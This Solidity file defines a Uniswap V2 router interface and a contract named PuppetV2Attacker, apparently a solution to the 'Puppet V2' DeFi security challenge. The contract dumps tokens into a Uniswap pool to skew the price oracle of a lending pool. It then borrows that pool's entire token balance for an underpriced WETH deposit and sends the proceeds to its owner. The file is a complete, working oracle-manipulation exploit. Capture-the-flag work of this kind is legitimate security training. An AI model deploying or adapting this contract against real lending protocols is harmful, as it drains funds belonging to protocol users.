// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import '@openzeppelin/contracts/token/ERC20/IERC20.sol';
import '@openzeppelin/contracts/utils/Address.sol';
import '../IWETH9.sol';

import 'hardhat/console.sol';

// https://github.com/Uniswap/v2-periphery/blob/master/contracts/interfaces/IUniswapV2Router01.sol
interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}

interface IPuppetV2Pool {
    function borrow(uint256 borrowAmount) external;

    function calculateDepositOfWETHRequired(uint256 tokenAmount)
        external
        view
        returns (uint256);
}

/**
 * @title PuppetV2Attacker
 * @author jb
 */
contract PuppetV2Attacker {
    using Address for address payable;

    address payable private _owner;
    IWETH9 private _weth;
    IUniswapV2Router01 private _router;

    uint256 _lock = 1;
    modifier nonreentrant() {
        require(_lock == 1, 'reentrancy');
        _lock = 2;
        _;
        _lock = 1;
    }

    constructor(IWETH9 weth, IUniswapV2Router01 router) {
        _owner = payable(msg.sender);
        _weth = weth;
        _router = router;
    }

    function attack(
        IPuppetV2Pool target,
        address token,
        uint256 amount,
        uint256 initialAmountOutMin
    ) external payable nonreentrant {
        _attack(target, token, amount, initialAmountOutMin, msg.sender);
    }

    /// @dev poor MEV protection
    function _attack(
        IPuppetV2Pool target,
        address token,
        uint256 amount,
        uint256 initialAmountOutMin,
        address user
    ) internal {
        // wrap any eth
        _weth.deposit{value: msg.value}();

        IERC20 erc20 = IERC20(token);

        // transfer in from caller
        erc20.transferFrom(user, address(this), amount);

        // unbalance uniswap pool
        erc20.approve(address(_router), amount);
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = address(_weth);
        _router.swapExactTokensForTokens(
            amount,
            initialAmountOutMin,
            path,
            address(this),
            block.timestamp
        );

        // get the reward
        uint256 reward = erc20.balanceOf(address(target));
        uint256 price = target.calculateDepositOfWETHRequired(reward);
        uint256 bal = _weth.balanceOf(address(this));
        console.log('price: %s', price);
        if (bal > price) {
            console.log('dif: %s - %s = %s', bal, price, bal - price);
        } else {
            console.log('dif: %s - %s = %s', price, bal, price - bal);
        }
        require(price <= bal, 'too poor');
        _weth.approve(address(target), price);
        target.borrow(reward);

        // send reward
        uint256 tokenBal = erc20.balanceOf(address(this));
        if (tokenBal > 0) {
            erc20.transfer(_owner, tokenBal);
        }
        uint256 wethBal = _weth.balanceOf(address(this));
        if (wethBal > 0) {
            _weth.transfer(_owner, wethBal);
        }
        if (address(this).balance > 0) {
            _owner.sendValue(address(this).balance);
        }
    }

    // function _swap(
    //     IUniswapV1 pool,
    //     address token,
    //     uint256 amount
    // ) internal {
    //     uint256 amountOut = pool.getTokenToEthInputPrice(amount);
    //     pool.tokenToEthSwapInput(amount, amountOut, block.timestamp);
    // }

    receive() external payable {}
}
